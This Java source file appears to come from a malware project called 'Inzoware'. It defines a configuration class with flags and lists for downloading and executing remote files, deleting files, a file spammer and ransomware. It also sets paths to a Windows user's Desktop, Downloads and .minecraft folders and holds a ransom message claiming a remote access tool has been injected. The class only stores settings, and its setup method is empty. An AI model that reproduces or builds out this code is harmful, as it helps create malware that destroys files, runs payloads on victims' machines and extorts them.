package com.inzo.technologies.inzoware.scripts;

import java.util.ArrayList;
import java.util.HashMap;

import com.inzo.technologies.inzoware.utils.InitUtils;

public class Scripts {
	
	public static String desktop = "C:\\Users\\" + InitUtils.getName() + "\\Desktop\\";
	public static String downloads = "C:\\Users\\" + InitUtils.getName() + "\\Downloads\\";
	public static String minecraft = "C:\\Users\\" + InitUtils.getName() + "\\AppData\\Roaming\\.minecraft\\";
	
	boolean doDownload = false;
	boolean doExecute = false;
	boolean doDelete = false;
	boolean doRansomware = false;
	boolean doFileSpammer = false;
	
	private HashMap<String, String> fileDownloads = new HashMap<>();
	
	private ArrayList<String> fileSpammer = new ArrayList<>();
	
	private ArrayList<String> fileExecutes = new ArrayList<>();
	
	private ArrayList<String> fileDeletes = new ArrayList<>();
	
	public static String ransomText = "We Have Injected Our Remote Access Tool Into Your Computer If You Want It Removed then Make An Issue With github.com/Inzo-Technologies";
	
	public Scripts() {
		
	}
	
	public void setup() {

	}
	
	private void addFileDownload(String url, String location) {
		fileDownloads.put(url, location);
	}
	
	private void addFileSpammer(String fileLoc) {
		fileSpammer.add(fileLoc);
	}
	
	private void addFileExecute(String location) {
		fileExecutes.add(location);
	}
	
	private void addFileDelete(String location) {
		fileDeletes.add(location);
	}
	
	public HashMap<String, String> getFileDownloads(){
		return fileDownloads;
	}
	
	public ArrayList<String> getFileSpammers(){
		return fileSpammer;
	}
	
	public ArrayList<String> getFileExecutes() {
		return fileExecutes;
	}
	
	public ArrayList<String> getFileDeletes() {
		return fileDeletes;
	}
	
	private void doesDownload(boolean doesIt) {
		doDownload = doesIt;
	}
	
	private void doesExecute(boolean doesIt) {
		doExecute = doesIt;
	}
	
	private void doesDelete(boolean doesIt) {
		doDelete = doesIt;
	}
	
	private void doesRansomware(boolean doesIt) {
		doRansomware = doesIt;
	}
	
	private void doesFileSpammer(boolean doesIt) {
		doFileSpammer = doesIt;
	}
	
	public boolean getDoesDownload() {
		return doDownload;
	}
	
	public boolean getDoesExecute() {
		return doExecute;
	}
	
	public boolean getDoesDelete() {
		return doDelete;
	}
	
	public boolean getDoesRansomware() {
		return doRansomware;
	}
	
	public boolean getDoesFileSpammer() {
		return doFileSpammer;
	}

}
